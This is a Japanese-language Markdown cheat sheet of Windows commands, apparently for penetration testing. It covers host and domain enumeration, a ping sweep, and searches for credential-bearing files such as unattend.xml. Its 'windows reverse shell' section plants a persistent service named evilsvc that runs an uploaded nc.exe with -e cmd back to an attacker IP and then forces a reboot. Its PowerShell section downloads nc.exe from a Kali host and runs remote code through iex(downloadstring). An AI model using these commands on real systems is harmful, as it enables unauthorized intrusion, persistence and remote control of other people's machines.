# windows command

* net XXX

``` bat
    # ユーザ情報
    net user
    または
    wmic USERACCOUNT Get Domain,Name,Sid
    # ログオンとかパスワード条件とか
    net accounts
    # ローカルグループ情報
    net localgroup
```

* tasklist

``` bat
    tasklist /SVC
    
    tasklist /m
```

* schtasks

```bat
    # /S: 接続先リモートシステム
    # /U: ユーザ名
    # /P: パスワード
    # /TN: タスク名
    # /SC: スケジュール(1回) 
    # /SD: 開始日
    # /ST: 開始時刻
    # /TR: 実行タスク
    schtasks /Create /S 192.168.xxx.xxx /U <user> /P <password> /TN sample /SC ONCE /SD 1900/01/01 /ST 00:00 /TR C:¥Remote¥test.bat

    # タスクの一覧表示(詳細)
    schtasks /query /fo list /v
```

* システム情報

```bat
    systeminfo
    または
    wmic computersystem LIST full
```

* マウント情報(共有ドライブとか)

``` bat
    mountvol
```

* ドメイン情報

``` bat
    #　ドメコン名とかの取得
    nltest /dsgetdc:<domain>
```

* ping sweep

``` bat
    for /l %i in (1,1,255) do @ping -n 1 -w 100 XXX.XXX.XXX.%i | find "TTL="
```

* ファイル検索

``` bat
    dir /s *<file_name>*  
　  # 検索でよく使うファイルパターン
    *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
```

* kaliにあるwindowsで実行可能なファイル
  
    `/usr/share/windows-binaries`

* windows reverse shell
  * windowsサービス

``` bat
    #wordpressから[nc.exe]をfile uploadする必要がある。
    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe XXX.XX.XX.XX PPPP -e cmd\"" /f

    #再起動できる場合は再起動
    shutdown /r /t 0 /f
```

* sc

``` batch
    # サービス登録コマンド
    # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
    sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
    # サービス情報の表示
    sc qc <service_name>
    # サービス起動
    sc start <service_name>
    # サービス停止
    sc stop <service_name>
```

* wmic

``` bat
    #システム情報
    wmic computersystem LIST full
    #サービス検索
    wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\"
    #ファイル検索
    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE
```

* whoami

``` bat
    whoami
    #権限表示
    whoami /priv
    #グループ表示
    whoami /group
```

## PowerShell

* バージョン確認

``` powershell
    $PsVersionTable
```

* ファイルダウンロード

``` powershell
    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc.exe" -OutFile "nc.exe")
    
    iwr -Uri http://XXX.XXX.XXX.XXX/<file_name> -OutFile "<file_path>\<file_name>>"
    
    iex(new-object net.webclient).downloadstring('http://XXX.XXX.XXX.XXX/<file_name>')
```

* 共有ドライブ

``` powershell
    powershell -Command "Get-WmiObject -class Win32_Share"
```
